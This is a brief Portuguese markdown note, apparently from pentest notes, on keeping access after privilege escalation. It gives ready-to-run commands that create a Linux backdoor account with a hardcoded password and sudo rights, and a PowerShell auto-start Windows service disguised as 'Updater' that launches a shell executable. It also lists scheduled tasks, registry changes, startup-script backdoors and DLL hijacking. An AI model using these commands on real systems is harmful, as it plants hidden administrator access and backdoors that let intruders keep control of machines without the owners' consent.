# 🛡️ Técnicas de Persistência

Após escalar privilégios, é importante garantir que o acesso ao sistema permaneça.

---

## 🧪 1. Linux – Usuário com sudo

```bash
useradd backdooruser -m -s /bin/bash
echo "backdooruser:P@ssw0rd123" | chpasswd
usermod -aG sudo backdooruser
```

---

## 🧪 2. Windows – Serviço automático com shell

```powershell
$serviceName = "Updater"
$binaryPath = "C:\Windows\Temp\shell.exe"
New-Service -Name $serviceName -BinaryPathName $binaryPath -StartupType Automatic
Start-Service -Name $serviceName
```

---

## 📌 Outras técnicas:

- Agendador de tarefas (`schtasks`)
- Modificação de registros (regedit)
- Backdoor em scripts de inicialização
- DLL hijacking

**Atenção:** Sempre documente os caminhos utilizados para facilitar a análise posterior.

